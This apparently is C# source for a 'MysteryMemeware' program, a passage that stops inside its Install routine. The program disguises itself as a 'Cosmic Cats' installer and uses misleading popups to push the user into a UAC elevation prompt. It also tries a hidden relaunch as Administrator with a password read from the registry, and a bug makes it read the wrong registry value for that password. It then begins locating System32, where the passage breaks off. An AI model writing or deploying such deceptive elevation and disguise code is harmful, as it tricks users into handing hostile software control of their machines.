namespace MysteryMemeware
{
    public static class Program
    {
        //Approved 07/31/2022 21:59pm
        public static void Main()
        {
            #region Main
            {
                #region DebugFlags
                bool debugFlag_Main_A = false;
                bool debugFlag_Main_A_0 = false;
                #endregion
                try
                {
                    if (IsInstalled())
                    {
                        if (IsAdmin())
                        {
                            Run();
                        }
                        else
                        {
                            bool elevationSuccessful = SelfElevate();
                            if (!elevationSuccessful)
                            {
                                debugFlag_Main_A_0 = true;
                                Run();
                            }
                        }
                    }
                    else
                    {
                        if (IsAdmin())
                        {
                            Install();
                        }
                        else
                        {
                            BegForAdmin();
                        }
                    }
                }
                catch
                {
                    debugFlag_Main_A = true;
                }
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_Main_A", debugFlag_Main_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_Main_A_0", debugFlag_Main_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
            #region Kill Current Process
            {
                #region DebugFlags
                bool debugFlag_Kill_A = false;
                #endregion
                try
                {
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
                catch
                {
                    debugFlag_Kill_A = true;
                }
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_Kill_A", debugFlag_Kill_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
        }
        //Approved 07/30/2022 3:49pm
        public static bool IsInstalled()
        {
            #region IsInstalled
            bool isInstalled = false;
            {
                #region DebugFlags
                bool debugFlag_IsInstalled_A = false;
                bool debugFlag_IsInstalled_A_0 = false;
                bool debugFlag_IsInstalled_A_1 = false;
                bool debugFlag_IsInstalled_A_2 = false;
                bool debugFlag_IsInstalled_A_3 = false;
                bool debugFlag_IsInstalled_A_4 = false;
                bool debugFlag_IsInstalled_A_5 = false;
                bool debugFlag_IsInstalled_A_6 = false;
                #endregion
                try
                {
                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
                    if (mysteryMemeware is null)
                    {
                        debugFlag_IsInstalled_A_0 = true;

                        try
                        {
                            localMachine.Close();
                            localMachine.Dispose();
                        }
                        catch
                        {
                            debugFlag_IsInstalled_A_1 = true;
                        }

                        goto SoftExceptionThrown;
                    }
                    object isInstalledObject = mysteryMemeware.GetValue("IsInstalled", null);
                    try
                    {
                        mysteryMemeware.Close();
                        mysteryMemeware.Dispose();
                    }
                    catch
                    {
                        debugFlag_IsInstalled_A_2 = true;
                    }
                    try
                    {
                        localMachine.Close();
                        localMachine.Dispose();
                    }
                    catch
                    {
                        debugFlag_IsInstalled_A_3 = true;
                    }
                    if (isInstalledObject is null)
                    {
                        debugFlag_IsInstalled_A_4 = true;

                        goto SoftExceptionThrown;
                    }
                    if (isInstalledObject.GetType() != typeof(string))
                    {
                        debugFlag_IsInstalled_A_5 = true;

                        goto SoftExceptionThrown;
                    }
                    string isInstalledString = (string)isInstalledObject;
                    try
                    {
                        isInstalledString = isInstalledString.ToLower();
                    }
                    catch
                    {
                        debugFlag_IsInstalled_A_6 = true;
                    }
                    if (isInstalledString is "1" || isInstalledString is "true" || isInstalledString is "t" || isInstalledString is "yes" || isInstalledString is "y")
                    {
                        isInstalled = true;
                    }
                    else
                    {
                        isInstalled = false;
                    }
                }
                catch
                {
                    debugFlag_IsInstalled_A = true;
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_IsInstalled_A", debugFlag_IsInstalled_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_0", debugFlag_IsInstalled_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_1", debugFlag_IsInstalled_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_2", debugFlag_IsInstalled_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_3", debugFlag_IsInstalled_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_4", debugFlag_IsInstalled_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_5", debugFlag_IsInstalled_A_5.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsInstalled_A_6", debugFlag_IsInstalled_A_6.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            return isInstalled;
            #endregion
        }
        //Approved 07/30/2022 3:49pm
        public static bool IsAdmin()
        {
            #region IsAdmin
            bool isAdmin = false;
            {
                #region DebugFlags
                bool debugFlag_IsAdmin_A = false;
                bool debugFlag_IsAdmin_A_0 = false;
                #endregion
                try
                {
                    System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                    System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity);
                    bool possibleIsAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                    try
                    {
                        identity.Dispose();
                    }
                    catch
                    {
                        debugFlag_IsAdmin_A_0 = true;
                    }
                    isAdmin = possibleIsAdmin;
                }
                catch
                {
                    debugFlag_IsAdmin_A = true;
                }
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_IsAdmin_A", debugFlag_IsAdmin_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_IsAdmin_A_0", debugFlag_IsAdmin_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            return isAdmin;
            #endregion
        }
        //Approved 07/30/2022 3:49pm
        public static bool SelfElevate()
        {
            #region GetAdminPass
            string adminPassword = null;
            {
                #region DebugFlags
                bool debugFlag_GetAdminPass_A = false;
                bool debugFlag_GetAdminPass_A_0 = false;
                bool debugFlag_GetAdminPass_A_1 = false;
                bool debugFlag_GetAdminPass_A_2 = false;
                bool debugFlag_GetAdminPass_A_3 = false;
                bool debugFlag_GetAdminPass_A_4 = false;
                bool debugFlag_GetAdminPass_A_5 = false;
                bool debugFlag_GetAdminPass_A_6 = false;
                #endregion
                try
                {
                    Microsoft.Win32.RegistryKey localMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey mysteryMemeware = localMachine.OpenSubKey("SOFTWARE\\MysteryMemeware", false);
                    if (mysteryMemeware is null)
                    {
                        debugFlag_GetAdminPass_A_0 = true;

                        try
                        {
                            localMachine.Close();
                            localMachine.Dispose();
                        }
                        catch
                        {
                            debugFlag_GetAdminPass_A_1 = true;
                        }

                        goto SoftExceptionThrown;
                    }
                    object adminPasswordObject = mysteryMemeware.GetValue("IsInstalled", null);
                    try
                    {
                        mysteryMemeware.Close();
                        mysteryMemeware.Dispose();
                    }
                    catch
                    {
                        debugFlag_GetAdminPass_A_2 = true;
                    }
                    try
                    {
                        localMachine.Close();
                        localMachine.Dispose();
                    }
                    catch
                    {
                        debugFlag_GetAdminPass_A_3 = true;
                    }
                    if (adminPasswordObject is null)
                    {
                        debugFlag_GetAdminPass_A_4 = true;

                        goto SoftExceptionThrown;
                    }
                    if (adminPasswordObject.GetType() != typeof(string))
                    {
                        debugFlag_GetAdminPass_A_5 = true;

                        goto SoftExceptionThrown;
                    }
                    string potentialAdminPassword = (string)adminPasswordObject;
                    try
                    {
                        potentialAdminPassword = potentialAdminPassword.ToLower();
                    }
                    catch
                    {
                        debugFlag_GetAdminPass_A_6 = true;
                    }
                    adminPassword = potentialAdminPassword;
                }
                catch
                {
                    debugFlag_GetAdminPass_A = true;
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A", debugFlag_GetAdminPass_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_0", debugFlag_GetAdminPass_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_1", debugFlag_GetAdminPass_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_2", debugFlag_GetAdminPass_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_3", debugFlag_GetAdminPass_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_4", debugFlag_GetAdminPass_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_5", debugFlag_GetAdminPass_A_5.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_GetAdminPass_A_6", debugFlag_GetAdminPass_A_6.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
            #region LocateExe
            string currentExecutablePath = null;
            {
                #region DebugFlags
                bool debugFlag_LocateExe_A = false;
                bool debugFlag_LocateExe_A_0 = false;
                bool debugFlag_LocateExe_A_1 = false;

                bool debugFlag_LocateExe_B = false;
                bool debugFlag_LocateExe_B_0 = false;
                bool debugFlag_LocateExe_B_1 = false;
                #endregion
                try
                {
                    string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
                    try
                    {
                        potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                    }
                    catch
                    {
                        debugFlag_LocateExe_A_0 = true;
                    }
                    if (!System.IO.File.Exists(potentialCurrentExecutablePath))
                    {
                        debugFlag_LocateExe_A_1 = true;
                        goto SoftExceptionThrown;
                    }
                    currentExecutablePath = potentialCurrentExecutablePath;
                }
                catch
                {
                    debugFlag_LocateExe_A = true;
                    try
                    {
                        string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                        try
                        {
                            potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                        }
                        catch
                        {
                            debugFlag_LocateExe_B_0 = true;
                        }
                        if (!System.IO.File.Exists(potentialCurrentExecutablePath))
                        {
                            debugFlag_LocateExe_B_1 = true;
                            goto SoftExceptionThrown;
                        }
                        currentExecutablePath = potentialCurrentExecutablePath;
                    }
                    catch
                    {
                        debugFlag_LocateExe_B = true;
                    }
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_LocateExe_A", debugFlag_LocateExe_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_A_0", debugFlag_LocateExe_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_A_1", debugFlag_LocateExe_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B", debugFlag_LocateExe_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B_0", debugFlag_LocateExe_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B_1", debugFlag_LocateExe_B_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
            #region SelfElevate
            bool selfElevateSuccessful = false;
            {
                #region DebugFlags
                bool debugFlag_SelfElevate_A = false;
                bool debugFlag_SelfElevate_A_0 = false;
                bool debugFlag_SelfElevate_A_1 = false;
                bool debugFlag_SelfElevate_A_2 = false;
                bool debugFlag_SelfElevate_A_3 = false;
                bool debugFlag_SelfElevate_A_4 = false;
                #endregion
                try
                {
                    if (adminPassword is null)
                    {
                        debugFlag_SelfElevate_A_0 = true;
                        goto SoftExceptionThrown;
                    }
                    if (currentExecutablePath is null)
                    {
                        debugFlag_SelfElevate_A_1 = true;
                        goto SoftExceptionThrown;
                    }
                    System.Diagnostics.ProcessStartInfo selfElevateStartInfo = new System.Diagnostics.ProcessStartInfo();
                    selfElevateStartInfo.Arguments = "";
                    selfElevateStartInfo.CreateNoWindow = true;
                    selfElevateStartInfo.Domain = null;
                    selfElevateStartInfo.ErrorDialog = false;
                    selfElevateStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
                    selfElevateStartInfo.FileName = currentExecutablePath;
                    selfElevateStartInfo.LoadUserProfile = false;
                    selfElevateStartInfo.Password = null;
                    selfElevateStartInfo.PasswordInClearText = adminPassword;
                    selfElevateStartInfo.RedirectStandardError = false;
                    selfElevateStartInfo.RedirectStandardInput = false;
                    selfElevateStartInfo.RedirectStandardOutput = false;
                    selfElevateStartInfo.StandardErrorEncoding = null;
                    selfElevateStartInfo.StandardOutputEncoding = null;
                    selfElevateStartInfo.UserName = "Administrator";
                    selfElevateStartInfo.UseShellExecute = false;
                    selfElevateStartInfo.Verb = "";
                    selfElevateStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    try
                    {
                        selfElevateStartInfo.WorkingDirectory = (new System.IO.FileInfo(currentExecutablePath)).DirectoryName;
                    }
                    catch
                    {
                        debugFlag_SelfElevate_A_2 = true;
                        try
                        {
                            selfElevateStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
                        }
                        catch
                        {
                            debugFlag_SelfElevate_A_3 = true;
                            try
                            {
                                selfElevateStartInfo.WorkingDirectory = null;
                            }
                            catch
                            {
                                debugFlag_SelfElevate_A_4 = true;
                            }
                        }
                    }
                    System.Diagnostics.Process.Start(selfElevateStartInfo);
                    selfElevateSuccessful = true;
                }
                catch
                {
                    debugFlag_SelfElevate_A = true;
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_SelfElevate_A =", debugFlag_SelfElevate_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_SelfElevate_A_0", debugFlag_SelfElevate_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_SelfElevate_A_1", debugFlag_SelfElevate_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_SelfElevate_A_2", debugFlag_SelfElevate_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_SelfElevate_A_3", debugFlag_SelfElevate_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_SelfElevate_A_4", debugFlag_SelfElevate_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            return selfElevateSuccessful;
            #endregion
        }
        //Approved 07/30/2022 3:49pm
        public static void BegForAdmin()
        {
            #region ShowPopups
            bool userSelectedCancel = false;
            {
                #region DebugFlags
                bool debugFlag_ShowPopups_A = false;
                bool debugFlag_ShowPopups_B = false;
                bool debugFlag_ShowPopups_B_0 = false;
                #endregion
                try
                {
                    if (System.Windows.Forms.MessageBox.Show("Cosmic Cats is not yet installed on your computer. Would you like to install it now?", "Install Cosmic Cats?", System.Windows.Forms.MessageBoxButtons.YesNo) == System.Windows.Forms.DialogResult.No)
                    {
                        userSelectedCancel = true;
                    }
                }
                catch
                {
                    debugFlag_ShowPopups_A = true;
                }
                try
                {
                    if (userSelectedCancel)
                    {
                        debugFlag_ShowPopups_B_0 = true;
                        goto SoftExceptionThrown;
                    }
                    if (System.Windows.Forms.MessageBox.Show("Elevated permissions are required in order to install Cosmic Cats. Please select yes on the following popup to grant the neccessary permission, or you may select no to cancel the installation.", "Elevated Permissions Required.", System.Windows.Forms.MessageBoxButtons.OKCancel) == System.Windows.Forms.DialogResult.Cancel)
                    {
                        userSelectedCancel = true;
                    }
                }
                catch
                {
                    debugFlag_ShowPopups_B = true;
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_ShowPopups_A", debugFlag_ShowPopups_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_ShowPopups_B", debugFlag_ShowPopups_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_ShowPopups_B_0", debugFlag_ShowPopups_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
            #region LocateExe
            string currentExecutablePath = null;
            {
                #region DebugFlags
                bool debugFlag_LocateExe_A = false;
                bool debugFlag_LocateExe_A_0 = false;
                bool debugFlag_LocateExe_A_1 = false;

                bool debugFlag_LocateExe_B = false;
                bool debugFlag_LocateExe_B_0 = false;
                bool debugFlag_LocateExe_B_1 = false;
                #endregion
                try
                {
                    string potentialCurrentExecutablePath = typeof(Program).Assembly.Location;
                    try
                    {
                        potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                    }
                    catch
                    {
                        debugFlag_LocateExe_A_0 = true;
                    }
                    if (!System.IO.File.Exists(potentialCurrentExecutablePath))
                    {
                        debugFlag_LocateExe_A_1 = true;
                        goto SoftExceptionThrown;
                    }
                    currentExecutablePath = potentialCurrentExecutablePath;
                }
                catch
                {
                    debugFlag_LocateExe_A = true;
                    try
                    {
                        string potentialCurrentExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                        try
                        {
                            potentialCurrentExecutablePath = new System.IO.FileInfo(potentialCurrentExecutablePath).FullName;
                        }
                        catch
                        {
                            debugFlag_LocateExe_B_0 = true;
                        }
                        if (!System.IO.File.Exists(potentialCurrentExecutablePath))
                        {
                            debugFlag_LocateExe_B_1 = true;
                            goto SoftExceptionThrown;
                        }
                        currentExecutablePath = potentialCurrentExecutablePath;
                    }
                    catch
                    {
                        debugFlag_LocateExe_B = true;
                    }
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_LocateExe_A", debugFlag_LocateExe_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_A_0", debugFlag_LocateExe_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_A_1", debugFlag_LocateExe_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B", debugFlag_LocateExe_B.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B_0", debugFlag_LocateExe_B_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_LocateExe_B_1", debugFlag_LocateExe_B_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
            #region UserElevate
            {
                #region DebugFlags
                bool debugFlag_UserElevate_A = false;
                bool debugFlag_UserElevate_A_0 = false;
                bool debugFlag_UserElevate_A_1 = false;
                bool debugFlag_UserElevate_A_2 = false;
                bool debugFlag_UserElevate_A_3 = false;
                bool debugFlag_UserElevate_A_4 = false;
                bool debugFlag_UserElevate_A_5 = false;
                bool debugFlag_UserElevate_A_6 = false;
                bool debugFlag_UserElevate_A_7 = false;
                #endregion
                try
                {
                    if (userSelectedCancel)
                    {
                        debugFlag_UserElevate_A_0 = true;
                        goto SoftExceptionThrown;
                    }
                    if (currentExecutablePath is null)
                    {
                        debugFlag_UserElevate_A_1 = true;
                        goto SoftExceptionThrown;
                    }
                    System.Diagnostics.ProcessStartInfo userElevateStartInfo = new System.Diagnostics.ProcessStartInfo();
                    userElevateStartInfo.Arguments = "";
                    userElevateStartInfo.CreateNoWindow = false;
                    userElevateStartInfo.Domain = null;
                    userElevateStartInfo.ErrorDialog = false;
                    userElevateStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;
                    userElevateStartInfo.FileName = currentExecutablePath;
                    userElevateStartInfo.LoadUserProfile = false;
                    userElevateStartInfo.Password = null;
                    userElevateStartInfo.PasswordInClearText = null;
                    userElevateStartInfo.RedirectStandardError = false;
                    userElevateStartInfo.RedirectStandardInput = false;
                    userElevateStartInfo.RedirectStandardOutput = false;
                    userElevateStartInfo.StandardErrorEncoding = null;
                    userElevateStartInfo.StandardOutputEncoding = null;
                    userElevateStartInfo.UserName = null;
                    userElevateStartInfo.UseShellExecute = true;
                    userElevateStartInfo.Verb = "runas";
                    userElevateStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
                    try
                    {
                        userElevateStartInfo.WorkingDirectory = (new System.IO.FileInfo(currentExecutablePath)).DirectoryName;
                    }
                    catch
                    {
                        debugFlag_UserElevate_A_2 = true;
                        try
                        {
                            userElevateStartInfo.WorkingDirectory = System.IO.Path.GetDirectoryName(currentExecutablePath);
                        }
                        catch
                        {
                            debugFlag_UserElevate_A_3 = true;
                            try
                            {
                                userElevateStartInfo.WorkingDirectory = null;
                            }
                            catch
                            {
                                debugFlag_UserElevate_A_4 = true;
                            }
                        }
                    }
                    try
                    {
                        System.Diagnostics.Process.Start(userElevateStartInfo);
                    }
                    catch (System.ComponentModel.Win32Exception ex)
                    {
                        if (ex.NativeErrorCode == 1223)
                        {
                            debugFlag_UserElevate_A_5 = true;
                            try
                            {
                                System.Windows.Forms.MessageBox.Show("Elevated access was denied and therefore Cosmic Cats could not be installed. If you would like to install Cosmic Cats later simply run the installer again.", "Elevated Access Denied.", System.Windows.Forms.MessageBoxButtons.OK);
                            }
                            catch
                            {
                                debugFlag_UserElevate_A_6 = true;
                            }
                        }
                        else
                        {
                            debugFlag_UserElevate_A_7 = true;
                            goto SoftExceptionThrown;
                        }
                    }
                }
                catch
                {
                    debugFlag_UserElevate_A = true;
                }
            SoftExceptionThrown:
                #region SaveDebugFlags
                try
                {
                    Microsoft.Win32.RegistryKey currentUser = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.CurrentUser, Microsoft.Win32.RegistryView.Registry64);
                    Microsoft.Win32.RegistryKey debugFlags = currentUser.CreateSubKey("SOFTWARE\\MysteryMemeware\\DebugFlags", true);
                    debugFlags.SetValue("debugFlag_UserElevate_A =", debugFlag_UserElevate_A.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_0", debugFlag_UserElevate_A_0.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_1", debugFlag_UserElevate_A_1.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_2", debugFlag_UserElevate_A_2.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_3", debugFlag_UserElevate_A_3.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_4", debugFlag_UserElevate_A_4.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_5", debugFlag_UserElevate_A_5.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_6", debugFlag_UserElevate_A_6.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.SetValue("debugFlag_UserElevate_A_7", debugFlag_UserElevate_A_7.ToString(), Microsoft.Win32.RegistryValueKind.String);
                    debugFlags.Close();
                    debugFlags.Dispose();
                    currentUser.Close();
                    currentUser.Dispose();
                }
                catch
                {

                }
                #endregion
            }
            #endregion
        }



        //Pending Approval
        public static void Install()
        {
            #region LocateSystem32
            string system32Path = null;
            {
                #region DebugFlags
                bool debugFlag_LocateSystem32_A = false;
                bool debugFlag_LocateSystem32_A_0 = false;
                bool debugFlag_LocateSystem32_A_1 = false;
                bool debugFlag_LocateSystem32_A_2 = false;
                bool debugFlag_LocateSystem32_A_3 = false;
                bool debugFlag_LocateSystem32_B = false;
                bool debugFlag_LocateSystem32_B_0 = false;
                bool debugFlag_LocateSystem32_B_1 = false;
                bool debugFlag_LocateSystem32_B_2 = false;
                bool debugFlag_LocateSystem32_B_3 = false;
                bool debugFlag_LocateSystem32_B_4 = false;
                bool debugFlag_LocateSystem32_B_5 = false;
                bool debugFlag_LocateSystem32_C = false;
                bool debugFlag_LocateSystem32_C_0 = false;
                #endregion
                try
                {
                    string potentialSystem32Path = System.Environment.SystemDirectory;
                    if(potentialSystem32Path is null)
                    {
                        debugFlag_LocateSystem32_A_0 = true;
                        goto SoftExceptionThrown;
                    }
                    try
                    {
                        potentialSystem32Path = new System.IO.DirectoryInfo(potentialSystem32Path).FullName;
                    }
                    catch
                    {
                        debugFlag_LocateSystem32_A_1 = true;
                    }
                    try
                    {
                        if (potentialSystem32Path[potentialSystem32Path.Length - 1] == System.IO.Path.DirectorySeparatorChar || potentialSystem32Path[potentialSystem32Path.Length - 1] == System.IO.Path.AltDirectorySeparatorChar)
                        {
                            potentialSystem32Path = potentialSystem32Path.Substring(0, potentialSystem32Path.Length - 1);
                        }
                    }
                    catch
                    {
                        debugFlag_LocateSystem32_A_2 = true;
                    }
                    if (!System.IO.Directory.Exists(potentialSystem32Path))
                    {
                        debugFlag_LocateSystem32_A_3 = true;
                        goto SoftExceptionThrown;
                    }
